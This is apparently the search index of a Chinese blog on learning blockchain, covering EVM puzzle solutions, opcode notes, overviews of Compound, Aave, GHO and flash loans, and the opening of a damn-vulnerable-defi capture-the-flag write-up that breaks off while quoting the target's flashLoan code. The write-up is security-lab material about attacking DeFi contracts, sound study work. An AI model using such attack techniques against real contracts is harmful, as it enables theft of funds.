<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>区块链入门知识常用链接</title>
      <link href="/2024/08/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86%E9%93%BE%E6%8E%A5/"/>
      <url>/2024/08/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>推荐这个博主的整个入门区块链的方向，里面有个思维导图，值得一看.<a href="https://dukedaily.github.io/solidity-expert/cn/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.html">点击</a></li><li>WTF学院，学习 EVM ，solidity值得一看.<a href="https://www.wtf.academy/">点击</a></li><li>Ethernaut靶场练习，<a href="https://ethernaut.openzeppelin.com/">点击</a></li><li>damn-vulnerable-defi靶场练习，<a href="https://www.damnvulnerabledefi.xyz/">点击</a></li><li>EVM PUZZLES题解参考链接，<a href="https://learnblockchain.cn/article/5533">点击1</a>  <a href="https://dukedaily.github.io/solidity-expert/cn/09_EVM%E8%AF%A6%E8%A7%A3/02-evm-puzzles.html">点击二</a></li><li>evm code指令速查 <a href="https://www.evm.codes/?fork=shanghai">点击</a></li><li>注:自毁函数将会被弃用,<a href="https://eips.ethereum.org/EIPS/eip-4758">点击1</a>,<a href="https://eips.ethereum.org/EIPS/eip-6049">点击2</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>EVM puzzle</title>
      <link href="/2024/08/30/EVM-puzzle/"/>
      <url>/2024/08/30/EVM-puzzle/</url>
      
        <content type="html"><![CDATA[<h1 id="EVM-PUZZLE"><a href="#EVM-PUZZLE" class="headerlink" title="EVM PUZZLE"></a>EVM PUZZLE</h1><p><a href="https://github.com/fvictorio/evm-puzzles">运行游戏</a></p><h2 id="puzzle-1-CALLVALUE"><a href="#puzzle-1-CALLVALUE" class="headerlink" title="puzzle 1 CALLVALUE"></a>puzzle 1 CALLVALUE</h2><p>题目：</p><pre>pc     opcode  opcode name01      38      CODESIZE02      03      SUB03      56      JUMP04      FD      REVERT05      FD      REVERT06      5B      JUMPDEST07      00      STOP08      FD      REVERT09      FD      REVERT</pre><p>输入恰当的value，使得题目的 opcode 正确执行，直到执行STOP</p><p>分析：CALLVALUE实际上就是msg.value,它会将msg.value存储到栈顶,而JUMP会读取栈顶值，并跳转到相应的字节地址，由JUMPDEST承接,所以我们只需要让msg.value&#x3D;&#x3D;8即可</p><hr><h2 id="puzzles-2-CODESIZE"><a href="#puzzles-2-CODESIZE" class="headerlink" title="puzzles 2 CODESIZE"></a>puzzles 2 CODESIZE</h2><p>题目：</p><pre>pc      opcode  opcode name00      34      CALLVALUE01      38      CODESIZE02      03      SUB03      56      JUMP04      FD      REVERT05      FD      REVERT06      5B      JUMPDEST07      00      STOP08      FD      REVERT09      FD      REVERT</pre><p>msg.value是多少？</p><p>分析：CALLVALUE存储值到栈顶，STACK：[x]，CODESIZE获取当前EVM环境中的操作码SIZE，每个OPCODE为1byte，我们此时内存中共10个操作码，因此执行CODESIZE后，会向栈顶存入10，STACK：[10, x]，SUB会执行减法操作，并将结果如栈，STACK：[10 - x]<br>JUMP会跳到06字节，因此我们需要 10 - x &#x3D; 6，推导出：x &#x3D; 4，即msg.value为4</p><hr><h2 id="puzzles-3-CALLDATASIZE"><a href="#puzzles-3-CALLDATASIZE" class="headerlink" title="puzzles 3 CALLDATASIZE"></a>puzzles 3 CALLDATASIZE</h2><p>题目：</p><pre>pc      opcode  opcode name00      36      CALLDATASIZE01      56      JUMP02      FD      REVERT03      FD      REVERT04      5B      JUMPDEST05      00      STOP</pre><p>calldata是多少？</p><p>分析：JUMPDEST跳转到04，所以我们只要保证calldata到size为4即可，内容不限。即len(msg.data) &#x3D;&#x3D; 4,msg.data&#x3D;&#x3D;0x11223344</p><blockquote><p>补充：一个字节代表8位二进制数，一个16进制数代表4位二进制数，所以俩个16进制的数就代表一个字节</p></blockquote><hr><h2 id="puzzles-4-XOR"><a href="#puzzles-4-XOR" class="headerlink" title="puzzles 4 XOR"></a>puzzles 4 XOR</h2><p>题目：</p><pre>pc      opcode  opcode name00      34      CALLVALUE01      38      CODESIZE02      18      XOR03      56      JUMP04      FD      REVERT05      FD      REVERT06      FD      REVERT07      FD      REVERT08      FD      REVERT09      FD      REVERT0A      5B      JUMPDEST0B      00      STOP</pre><p>value是多少？</p><p>分析:CALLVALUE获取数值后入栈，STACK：[x],CODESIZE获取数值为12入栈，STACK：[12, x]<br>异或操作：<br>12：0000，1100<br>0A：0000，1010<br>x： 0000，0110 &#x3D;》6，所以答案为：6,即value为6</p><hr><h2 id="puzzles-5-JUPM1"><a href="#puzzles-5-JUPM1" class="headerlink" title="puzzles 5 JUPM1"></a>puzzles 5 JUPM1</h2><p>题目：</p><pre>        pc      opcode      opcode name00      34          CALLVALUE01      80          DUP102      02          MUL03      610100      PUSH2 010006      14          EQ07      600C        PUSH1 0C09      57          JUMPI0A      FD          REVERT0B      FD          REVERT0C      5B          JUMPDEST0D      00          STOP0E      FD          REVERT0F      FD          REVERT</pre><p>value是多少？</p><p>分析：</p><ul><li>CALLVALUE，STACK-&gt; [x]</li><li>DUP1：STACK-&gt; [x，x]</li><li>MUL：STACK-&gt; [mul_result]</li><li>PUSH2 0100：STACK-&gt; [0100，mul_result]</li><li>EQ：判断stack1和stack2是否相等，若相等，则清除这两个值，并向栈顶存入1，否则存入0</li><li>PUSH1 0C：STACK-&gt; [0C, 1]</li><li>JUMPI：读取stack2的值，如果为1，则跳转到stack1的位置，即0C，满足条件！<br>因此我们需要使得：0100 &#x3D; x*x，0x0100十进制为256，所以x &#x3D; 16，即value为16</li></ul><hr><h2 id="puzzles-6-CALLDATALOAD"><a href="#puzzles-6-CALLDATALOAD" class="headerlink" title="puzzles 6 CALLDATALOAD"></a>puzzles 6 CALLDATALOAD</h2><p>题目：</p><pre>pc      opcode  opcode name02      35        CALLDATALOAD04      FD        REVERT05      FD        REVERT06      FD        REVERT07      FD        REVERT08      FD        REVERT09      FD        REVERT0A      5B        JUMPDEST0B      00        STOP</pre><p>calldataload是 多少？</p><p>分析：</p><ul><li>PUSH1 00，STACK：【0x00】</li><li>CALLDATALOAD：获取input的数据，即calldata，参数为0x00，即从第00位置开始加载</li><li>JUMP想跳转到0A处，所以calldata的值为0x0a，如果我们直接输入0x0a，此时会被转化为：a00000000000000000000000000000000000000000000000000000000000000，这是错的；</li><li>由于calldata的数值总为32字节的倍数，所以此处应该为：0x000000000000000000000000000000000000000000000000000000000000000a</li></ul><hr><h2 id="puzzles-7-EXTCODESIZE"><a href="#puzzles-7-EXTCODESIZE" class="headerlink" title="puzzles 7 EXTCODESIZE"></a>puzzles 7 EXTCODESIZE</h2><p>题目：</p><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6000      PUSH1 0003      80        DUP104      37        CALLDATACOPY05      36        CALLDATASIZE06      6000      PUSH1 0008      6000      PUSH1 000A      F0        CREATE0B      3B        EXTCODESIZE0C      6001      PUSH1 010E      14        EQ0F      6013      PUSH1 1311      57        JUMPI12      FD        REVERT13      5B        JUMPDEST14      00        STOP</pre><p>calldata是多少？</p><p>分析：逐步分析，</p><pre>00      36        CALLDATASIZE    # [datasize]01      6000      PUSH1 00    # [00, datasize]03      80        DUP1        # [00, 00, datasize]04      37        CALLDATACOPY     # [] data被copy到memory中，栈被清空05      36        CALLDATASIZE    # [datasize]06      6000      PUSH1 00        # [00, datasize]08      6000      PUSH1 00        # [00, 00, datasize]0A      F0        CREATE    # [deployed_address] 栈被清空，从内存中读取数据，创建合约，返回地址 0B      3B        EXTCODESIZE    # [address_code_size] 输入地址，返回合约的size0C      6001      PUSH1 01    # [01, address_code_size]0E      14        EQ    # [1] address_code_size必须为1，后续的才成立0F      6013      PUSH1 1311      57        JUMPI12      FD        REVERT13      5B        JUMPDEST14      00        STOP</pre><p>就是我们传入的数据要的操作码要返回1，利用return操作符</p><pre>pc      opcode    opcode name00      6001      PUSH1 0104      F3        RETURN</pre><p>即 msg.data &#x3D;&#x3D; 0x60016000f3</p><hr><h2 id="puzzles-8-SWAP"><a href="#puzzles-8-SWAP" class="headerlink" title="puzzles 8 SWAP"></a>puzzles 8 SWAP</h2><p>题目：</p><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6000      PUSH1 0003      80        DUP104      37        CALLDATACOPY05      36        CALLDATASIZE06      6000      PUSH1 0008      6000      PUSH1 000A      F0        CREATE0B      6000      PUSH1 000D      80        DUP10E      80        DUP10F      80        DUP110      80        DUP111      94        SWAP512      5A        GAS13      F1        CALL14      6000      PUSH1 0016      14        EQ17      601B      PUSH1 1B19      57        JUMPI1A      FD        REVERT1B      5B        JUMPDEST1C      00        STOP</pre><p>calldata是多少？<br>分析：</p><pre>00      36        CALLDATASIZE    # [datasize]01      6000      PUSH1 00    # [00, datasize]03      80        DUP1    # [00, 00, datasize]04      37        CALLDATACOPY    # []  copy到内存中05      36        CALLDATASIZE    # [datasize]，直接生成数据，不需要栈参数06      6000      PUSH1 00    # [00, datasize]08      6000      PUSH1 00    # [00, 00, datasize]0A      F0        CREATE    # [deployed_address]0B      6000      PUSH1 00    # [00, deployed_address]0D      80        DUP1    # [00, 00, deployed_address]0E      80        DUP1    # [00, 00, 00, deployed_address]0F      80        DUP1    # [00, 00, 00, 00, deployed_address]10      80        DUP1    # [00, 00, 00, 00, 00, deployed_address]11      94        SWAP5    # [deployed_address, 00, 00, 00, 00, 00]，兑换1st 和 6th，你没有看错1和6，不是512      5A        GAS    # [gasAvail, deployed_address, 00, 00, 00, 00, 00] // 7个参数13      F1        CALL    # [0或1]调用函数，需要是0，0表示失败，1表示成功！（反推的14      6000      PUSH1 00    # [00, 0或1]，需要是016      14        EQ    # [0或1]，需要是117      601B      PUSH1 1B    # [1B, 0或1]，需要是119      57        JUMPI                       1A      FD        REVERT1B      5B        JUMPDEST1C      00        STOP</pre><p>逐步分析后，可得知我们需要做到call调用失败，这就要我们传入的数据revert,类似于puzzles#7</p><pre>pc      opcode    opcode name00      60FD      PUSH1 FD //FD 是revert操作符的编号02      6000      PUSH1 0004      53        MSTORE805      6001      PUSH1 0107      6000      PUSH1 0009      F3        RETURN</pre><p>即calldata&#x3D; 0x60fd60005360016000f3</p><hr><h2 id="puzzles-9-LT"><a href="#puzzles-9-LT" class="headerlink" title="puzzles 9 LT"></a>puzzles 9 LT</h2><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6003      PUSH1 0303      10        LT04      6009      PUSH1 0906      57        JUMPI07      FD        REVERT08      FD        REVERT09      5B        JUMPDEST0A      34        CALLVALUE0B      36        CALLDATASIZE0C      02        MUL0D      6008      PUSH1 080F      14        EQ10      6014      PUSH1 1412      57        JUMPI13      FD        REVERT14      5B        JUMPDEST15      00        STOP</pre><p>value?<br>calldata?</p><p>分析：就是一个推理题，00-09:datasize&gt;3,0A-12:value*datasize&#x3D;8,datasize&#x3D;4,value&#x3D;2<br>calldata的字节数为4，随意构造calldata&#x3D;0x12345678</p><hr><h2 id="puzzles-10-ISZERO"><a href="#puzzles-10-ISZERO" class="headerlink" title="puzzles 10 ISZERO"></a>puzzles 10 ISZERO</h2><p>题目：</p><pre>pc      opcode      opcode name00      38          CODESIZE01      34          CALLVALUE02      90          SWAP103      11          GT04      6008        PUSH1 0806      57          JUMPI07      FD          REVERT08      5B          JUMPDEST09      36          CALLDATASIZE0A      610003      PUSH2 00030D      90          SWAP10E      06          MOD0F      15          ISZERO10      34          CALLVALUE11      600A        PUSH1 0A13      01          ADD14      57          JUMPI15      FD          REVERT16      FD          REVERT17      FD          REVERT18      FD          REVERT19      5B          JUMPDEST1A      00          STOP</pre><p>value?<br>calldata?</p><p>分析：00-06：value&lt;23;09-0f:calldata mod 3&#x3D;&#x3D;0;10-14:value+0a&#x3D;19,注意19为16进制的数，value&#x3D;15,calldata的字节数为3，随意构造calldta&#x3D;0x123456</p><p>10道EVM puzzles就完成了！！！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>EVM入门</title>
      <link href="/2024/08/19/EVM%E5%85%A5%E9%97%A8/"/>
      <url>/2024/08/19/EVM%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Opcodes"><a href="#Opcodes" class="headerlink" title="Opcodes"></a>Opcodes</h2><p>Opcodes（操作码）是以太坊智能合约的基本单元。我们写的Solidity智能合约会被编译为字节码（bytecode），然后才能在EVM（以太坊虚拟机）上运行。而字节码就是由一系列Opcodes组成的。当用户在EVM中调用这个智能合约的函数时，EVM会解析并执行这些Opcodes，以实现合约逻辑。</p><h2 id="常见的Opcodes"><a href="#常见的Opcodes" class="headerlink" title="常见的Opcodes"></a>常见的Opcodes</h2><p><code>PUSH1</code>: 将一个字节的数据压入堆栈。例如，PUSH1 0x60 就是将 0x60 压入堆栈。<br><code>DUP1</code> : 复制堆栈顶部的一个元素。<br><code>SWAP1</code>: 交换堆栈顶部的前两个元素。</p><p>例如：下面是一个简单的Solidity智能合约，它只有一个add()函数，计算1+1的结果并返回。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">contract Add &#123;</span><br><span class="line">    function add() public pure returns (uint256 result) &#123;</span><br><span class="line">        result = 1+1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将合约编译后，我们可以得到合约对应的bytecode:<strong>60806040523480156100…</strong></p><p>通过bytecode，我们可以得到合约对应的opcodes为:<strong>PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 …</strong></p><blockquote><p>我认为需要特别记忆的基本Opcodes:<br>PUSH1:将一个长度为1字节的数据压入堆栈顶部。同理可知：PUSH2就是压入长度为俩个字节的数据进入栈堆顶部<br>ADD:会弹出堆栈顶部的两个元素，计算它们的和，然后将结果压入堆栈。<br>PUSH0:就是将0压入栈堆<br>MUL: 会弹出堆栈顶部的两个元素，计算它们的乘，然后将结果压入堆栈。<br>SUB: 会弹出堆栈顶部的两个元素，第二个元素减去第一个元素，然后将结果压入堆栈<br>DUPx:就是复制第x个元素到栈顶<br>LT:从堆栈中弹出两个元素，比较第二个元素是否小于第一个元素。如果是，那么将1推入堆栈，否则将0推入堆栈。如果堆栈元素不足两个，那么会抛出异常。<br>GT:从堆栈中弹出两个元素，比较第二个元素是否大于第一个元素。如果是，那么将1推入堆栈，否则将0推入堆栈。如果堆栈元素不足两个，那么会抛出异常。<br>EQ:从堆栈中弹出两个元素，比较第二个元素是否等于第一个元素。如果是，那么将1推入堆栈，否则将0推入堆栈。如果堆栈元素不足两个，那么会抛出异常。<br>AND:从栈堆中弹出俩个元素,比较位级,如2(0000 0010)和3(0000 0011),则入栈的是2<br>OR:从栈堆中弹出俩个元素,比较位级,如2(0000 0010)和3(0000 0011),则入栈的是3<br>XOR:它是异或运算,,如2(0000 0010)和3(0000 0011),则入栈的是1(0000 0001),就是比较依次它们2进制的数,俩个0相遇或者俩个1相遇就为0,不同的相遇就为1<br>SHL:指令执行左移位操作，从堆栈中弹出两个元素，将第二个元素左移第一个元素位数，然后将结果推回栈顶。将2（0000 0010）和3（0000 0011）推入堆栈，然后将2左移3位，结果应该为16（0001 0000）。<br>SHR:同上,只不过向右移,字节码将16（0001 0000）和3（0000 0011）推入堆栈，然后将16右移3位，结果应该为2（0000 0010）。<br>MSTORE:指令用于将一个256位（32字节）的值存储到内存中。它从堆栈中弹出两个元素，第一个元素为内存的地址（偏移量 offset），第二个元素为存储的值（value）。<br>STOP:它的作用是停止当前上下文的执行，并成功退出。<br>JUMP:用于无条件跳转到一个新的程序计数器位置。它从堆栈中弹出一个元素，将这个元素设定为新的程序计数器（pc）的值。搭配JUMPDEST(标记一个有效的跳转目标位置)使用<br>JUMP1:用于条件跳转，它从堆栈中弹出两个元素，如果第二个元素（条件，condition）不为0，那么将第一个元素（目标，destination）设定为新的pc的值。<br>SWAP:交换,如SWAP1,交换栈顶与次栈顶,swap2,交换栈顶与第三个元素<br>CALLDATALOAD:从交易或合约调用的data字段加载数据。它从堆栈中弹出calldata的偏移量（offset），然后从calldata的offset位置读取32字节的数据并压入堆栈。如果calldata剩余不足32字节，则补0。<br>CALLDATASIZE:获取交易或合约调用的data字段的字节长度，并压入堆栈。<br>CALLDATACOPY:将data中的数据复制到内存中。它会从堆栈中弹出3个参数(mem_offset, calldata_offset, length)，分别对应写到内存的偏移量，读取calldata的偏移量和长度。<br>CODESIZE:获取当前合约代码的字节长度，然后压入堆栈。</p></blockquote><hr><h2 id="EVM基础"><a href="#EVM基础" class="headerlink" title="EVM基础"></a>EVM基础</h2><p>以太坊虚拟机（EVM）是以太坊区块链中的关键组件，充当开发人员的虚拟计算机或软件平台。这项创新允许创建和部署去中心化应用程序（DApp）以及在以太坊网络上执行智能合约。 EVM 由Vitalik Buterin于 2013 年提出概念，成为以太坊网络的核心，强调了其在决定以太坊区块链中每个区块的状态方面的基础作用。</p><p>EVM就是一个运行环境，就如同Java的运行环境一样，含义，分类都差不多，它包括了堆栈，内存，存储，EVM字节码，有一点编程基础的都知道堆栈，这种先进后出的结构，反正就是一个类似于JVM一样机器，它主要就是运行一些操作符opcode,真正的要理解熟悉opcode操作符，144个，<a href="https://www.evm.codes/?fork=shanghai">点击学习</a>,更多的详细指令参考<a href="https://www.wtf.academy/docs/evm-opcodes-101/">WTF</a>，我就不一一讲了，接下来就是大白话：</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li>跨区块链支持：EVM 支持字节码兼容的智能合约的能力使其能够跨各种区块链。 Polygon 和 Avalanche 等多个区块链都利用了此功能，使它们能够利用 EVM 强大的生态系统。</li><li>隔离沙箱环境：EVM 在同一计算机网络内单独操作每个代码段，确保一个应用程序的执行不会影响区块链的其余部分或节点计算机上存储的数据。这种隔离有利于快速高效的开发。</li><li>灵活的开发能力：EVM 擅长执行复杂且定制的智能合约，这对于包括 dApp、 DeFi平台、游戏和NFT在内的各种应用程序至关重要。此外，EVM 周围有一个庞大的开发人员社区，简化了软件构建过程。</li><li>跨操作系统的交叉兼容性：由于区块链网络中 MacOS、Windows 等操作系统的多样性，开发兼容软件可能具有挑战性。 EVM 通过标准化并支持跨多个操作系统执行程序来解决这个问题，而无需单独的代码库。</li></ul><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul><li>高交易成本（Gas 费） ：使用 EVM 最显着的缺点之一是加密 Gas费成本高昂。由于 EVM 的可扩展性限制，这些费用可能会迅速增加，尤其是在网络流量较高的时期。</li><li>可扩展性挑战：EVM 每秒只能处理有限数量的事务。这种限制可能会导致网络拥塞加剧，进一步推高汽油费。<br>部署智能合约的成本：以太坊的流行性质意味着部署自定义智能合约或更大的应用程序可能会成本高昂。开发人员必须优化其合约以提高效率，消除冗余代码或不必要的功能，并且还必须考虑以太坊区块链上的高存储成本。</li><li>智能合约的不可逆性：一旦部署，区块链上的智能合约就无法更改。如果在部署后发现错误或漏洞，则这种不变性会带来挑战，需要重新部署整个合约，这可能会产生额外的成本。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Compound</title>
      <link href="/2024/08/19/Compound/"/>
      <url>/2024/08/19/Compound/</url>
      
        <content type="html"><![CDATA[<h1 id="Compound"><a href="#Compound" class="headerlink" title="Compound"></a>Compound</h1><p>Compound是在Ethereum上运行的软件，旨在奖励分布式计算机网络运行传统货币市场。Compound允许用户将加密货币存入借贷池让借款人使用。而贷方从他们存入的资产赚取利息。 </p><p>存款后，Compound会奖励贷方名为cToken（代表存款）的新加密货币。cToken的例子包括cETH、cBAT以及cDAI。</p><p>每个cToken都可无限转让或交易，但只能兑换最初锁定在协议中的加密货币。整个过程由Compound代码自动处理，代表贷方可以随时提币。</p><p>为了激励这个行为，Compound使用了另一种称为COMP的自家加密货币。每当用户和Compound市场互动时（借入、提取或偿还资产），作为奖励他们都会获得额外的COMP代币。</p><p>简言之，Compound 是一个允许用户借贷代币的智能合约，它与你的银行类似，Compound 把你的钱借给借款人，并随着时间的推移赚取利息。但与银行不同的是，你的利息是从你存入 Compound 的智能合约后开始复利计算的。因为这是一个智能合约，整个流程中没有中间人，因此利息会比传统银行要高。</p><h2 id="运作机制"><a href="#运作机制" class="headerlink" title="运作机制"></a>运作机制</h2><p>Compound 协议让开发者可以基于以太坊建立各种各样的货币市场（money market）。<br>所谓的「货币市场」，其实就是一个个的独立币池单元，每个币池里只有一种代币，协议通过算法来决定这个池子里的币借贷的利率是多少。简单点说，这个算法会基于人们对这个币借贷的供需关系自动计算出利率。</p><p>不管你是来贷款还是放贷，你都是在跟 Compound 协议直接打交道。这一点跟那些点对点的借贷协议不太一样。在点对点的方案里，借贷双方会做匹配，然后你需要跟找你借钱的人（或者借你钱的人）进行沟通，双方自己商定好借款的利率、到期时间和抵押物品等等。</p><p>而在 Compound 协议里，每个代币（比如 Ether、Dai、USDC）都有一个属于自己的借贷市场，里面包含每个用户在这个市场里的余额，以及各笔生效的借贷交易，乃至每段时期的历史利率，等等。</p><p>用户可以通过抵押品的信贷额度无缝地从协议上借钱，你只需要看自己要借哪个币，不需要和别人沟通还款日期、利率，就能马上借钱。借款是实时且可预测的。每个货币市场都有一个由市场决定的浮动利率。</p><h2 id="清算保证"><a href="#清算保证" class="headerlink" title="清算保证"></a>清算保证</h2><p>Compound 协议强制应用了一条规则，即每个账户必须拥有足够的余额能够偿还借款的额度，叫做<strong>抵押率</strong>。每个账户无法做出任何会使「余额／借款额度」低于「抵押率」的行为。比如再借更多的钱或者把抵押款的余额提现。要增大或者重置抵押率，用户可以全额或者部分偿还借款。任何被 Compound 持有的余额，包括用户用来做抵押品的余额，同时也会产生正常的应计利息。</p><p>如果一个用户提供的抵押资产，除以他们信用额度所借的款项，低于抵押率，那他们的抵押资产就会（通过借款资产）被出售，出售的价格是当前市场价格减去清算折扣（liquidation discount）。这个机制会激励系统里的套利者，去快速减少借款人还不了的借款资产的短缺，从而降低协议的风险。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GHO</title>
      <link href="/2024/08/19/GHO/"/>
      <url>/2024/08/19/GHO/</url>
      
        <content type="html"><![CDATA[<h1 id="GHO"><a href="#GHO" class="headerlink" title="GHO"></a>GHO</h1><p>它是 Aave 协议中唯一一个去中心化、超额抵押的稳定币，作为以太坊主网上的去中心化稳定币，GHO 由用户铸造。与 Aave 协议上的所有借贷一样，用户必须提供抵押品（按特定抵押品比率）才能铸造 GHO。相应地，当用户偿还借贷头寸（或被清算）时，GHO 将返回 Aave 池并被销毁。GHO 铸造者累积的所有利息支付将直接进入Aave DAO 金库，这与用户借入其他资产时收集的标准准备金因子形成鲜明对比，本金将被销毁。</p><p>人们对真正去中心化、超额抵押和可配置的稳定币的需求很大。最近的事件证明了去中心化稳定币在市场波动期间维持稳定价值的用例。GHO 是一种由 Aave Governance 控制的稳定币，在社区支持下，它有潜力成为 DeFi 生态系统持续增长不可或缺的一部分。</p><p>与许多稳定币不同，GHO 的预言机价格是固定的。GHO 等去中心化稳定币是透明的，无法更改。利率由 Aave DAO 定义，偿还的利息将重定向到 DAO 而不是资产供应商。在安全模块中质押 AAVE 的借款人可享受折扣。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Aave学习知识</title>
      <link href="/2024/08/19/Aave%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/08/19/Aave%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Aave"><a href="#Aave" class="headerlink" title="Aave"></a>Aave</h1><h2 id="Aave-1"><a href="#Aave-1" class="headerlink" title="Aave"></a>Aave</h2><p>是一种完全去中心化的、社区管理的协议，Aave 是芬兰语，意思是“幽灵”，最初于 2017 年 11 月推出时被称为 ETHLend。 ETHLend 是一个点对对点借贷系统。后来进行改进才是Aave，用户可以在其中借入和借出加密资产。协议的价值主张是创建一个可供任何拥有加密资产的人使用的替代去中心化资产货币市场。</p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>Aave 是一个借贷池系统，使用户可以选择借入、借出和赚取 20 种不同数字资产的利息，而无需中间人。</p><p>想要赚取利息的用户将存入他们想要借出的资金，然后将其收集到流动性池中。当借款人贷款时，他们从这些资金池中提取资金。贷方可以以任何他们认为合适的方式交易或转让这些代币。</p><p>Aave 发行两种类型的代币来促进此活动，$AAVE（原生代币）和 aTokens。<br>$AAVE 令牌有多种使用方式：<br>1，如果支付费用，$AAVE 的所有者可以选择在向公众发布贷款之前查看贷款。</p><p>2， 使用 $AAVE 作为抵押品的用户可以比使用任何其他数字资产借入的金额略多。</p><p>3，代币持有者可以在平台上质押 $AAVE，以获得大约 6% 的 APY 分配。</p><p>aTokens 代币：</p><p>1，这些代币在存款时铸造，赎回时销毁。</p><p>2，它们与存入 Aave 协议的基础资产的价值以 1:1 的比率挂钩。</p><p>3，aTokens 为贷方提供“收据”，允许他们收取存款利息。</p><h2 id="v4"><a href="#v4" class="headerlink" title="v4"></a>v4</h2><p>今年（2024）5月，Avara 公布 Aave V4 版本的升级计划，重点放在进一步提升 Aave 的流动性与资产利用率。Aave V4 版本引入了流动性溢价功能，这是一个根据抵押品风险状况调整借款利率。为每种资产分配风险因子，依据市场和外部风险因素动态调整。风险较低的资产（如以太坊），将享受更低的借贷利率，而风险较高的资产（如山寨币）则相对提高借贷成本。</p><p>Aave V4 版本通过引入一系列创新功能，优化了借贷相关的安全性与用户体验并简化了治理流程：</p><ul><li><p>智能账户和金库的设计大幅提升了用户体验，智能账户允许用户通过单一钱包管理多个仓位。而智能账户实现的金库功能允许用户不直接向流动性层提供抵押品的情况下借款，抵押品将在借款活跃或清算事件发生时被锁定，增加了用户交互的便捷性和安全性。</p></li><li><p>V4 版本还提出了动态风险配置，以在市场条件变化时调整风险参数。用户在借款时会与资产的当前配置关联，而新的资产配置则为新用户提供，避免了影响现有借款人。此外 V4 引入了自动退市机制，简化了资产下架过程。</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比银行更高级的银行，它就是一个pool,在这里可以进行存款与借款，方便，信任度高,作为去中心化金融（DeFi）借贷领域的领头羊，Aave 在资产利用率、市场占有率和交易量方面均显著领先于竞争对手，扮演着关键角色。然而，Aave 的领先地位并非不可动摇。协议如 Radiant 和 Compound 已展示出强劲的增长潜力，并推出了具有增长潜力的新版本。为了巩固其市场地位，Aave 可以采取以下策略：加强其核心借贷业务，推动 GHO 的进一步发展并于 Aave 充分融合，建立 V4 版本所设计的 Aave Network ，以及拓展其非借贷业务生态。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>闪电贷</title>
      <link href="/2024/08/07/%E9%97%AA%E7%94%B5%E8%B4%B7/"/>
      <url>/2024/08/07/%E9%97%AA%E7%94%B5%E8%B4%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="闪电贷"><a href="#闪电贷" class="headerlink" title="闪电贷"></a>闪电贷</h1><p>闪电贷（Flash loan）：是一种无抵押、借贷金额无上限（可以借光池中所有的钱）的贷款。它要求借贷人快借快还，快到还款和借款在同一个交易内（同一个以太坊 transaction),在我看来就是非常迅速的借款还款</p><p>首先你要借钱的话，你要写个还钱合约，里面包括了如何赚钱，还本金加利息的数目，开始借款的话，就要实现一个flashloan()闪电贷合约，这个合约首先要先进行一系列的数据验证，再调用你的还钱合约，验证你是否还了本金加利息，如果没有还上，直接 revert 整个交易，让借款无效，从而保证借出方总是安全的。实现闪电贷通常有俩个合约。</p><p>闪电贷的优点：编写闪电贷合约总体并不复杂。使用闪电贷风险也比较小。如果赚钱逻辑失败，变成了亏钱逻辑，不能完成还款，那么也不用担心借来的巨款无力偿还。整个交易将会执行失败，就如同借款从来没有发生过一样。</p><p><a href="https://www.learnblockchain.cn/article/1926">实现你第一笔闪电贷合约</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>damn-vulnerable-defi题解</title>
      <link href="/2024/08/06/damn-vulnerable-defi%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/06/damn-vulnerable-defi%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-vulnerable-defi"><a href="#Damn-vulnerable-defi" class="headerlink" title="Damn-vulnerable-defi"></a><a href="https://www.damnvulnerabledefi.xyz/">Damn-vulnerable-defi</a></h1><h2 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h2><p>要求是，使拥有一百万DVI的钱包停止闪电贷的功能</p><p>分析：这个合约的代码在gittub上，要分开去看，这道题的解决就是靠一个基本的闪电贷的知识<br>首先要看闪电贷的函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)</span><br><span class="line">       external</span><br><span class="line">       returns (bool)</span><br><span class="line">   &#123;</span><br><span class="line">       if (amount == 0) revert InvalidAmount(0); // fail early</span><br><span class="line">       if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement</span><br><span class="line">       uint256 balanceBefore = totalAssets();</span><br><span class="line">       if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement</span><br><span class="line"></span><br><span class="line">       // transfer tokens out + execute callback on receiver</span><br><span class="line">       ERC20(_token).safeTransfer(address(receiver), amount);</span><br><span class="line"></span><br><span class="line">       // callback 